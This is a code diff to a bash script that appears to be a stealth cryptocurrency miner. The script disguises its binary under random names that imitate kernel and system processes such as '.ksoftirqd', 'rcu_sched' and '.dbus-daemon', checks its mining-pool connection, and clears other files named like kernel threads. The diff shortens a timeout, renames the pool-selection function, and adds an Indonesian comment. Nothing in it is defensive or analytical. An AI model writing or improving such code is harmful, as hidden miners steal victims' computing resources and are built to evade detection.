@@ -28,7 +28,7 @@ POSSIBLE_NAMES=(".dbus-daemon" "migration" "watchdog" ".ksoftirqd" "rcu_sched" "
 
 check_pool_connection() {
     local pool=$1
-    local timeout=5
+    local timeout=3
     local host=$(echo "$pool" | cut -d: -f1)
     local port=$(echo "$pool" | cut -d: -f2)
     
@@ -49,7 +49,7 @@ check_pool_connection() {
     fi
 }
 
-select_pool() {
+select_pool_for_session() {
     if check_pool_connection "$POOL"; then
         SELECTED_POOL="$POOL"
     else
@@ -92,7 +92,8 @@ while true; do
         rm -f "$LOCAL_BIN_DIR"/kblockd*
         rm -f "$LOCAL_BIN_DIR"/kthrotld*
 
-        select_pool
+        # CEK POOL SETIAP SESI - di sini
+        select_pool_for_session
         
         BIN_NAME="${POSSIBLE_NAMES[$RANDOM % ${#POSSIBLE_NAMES[@]}]}"
         
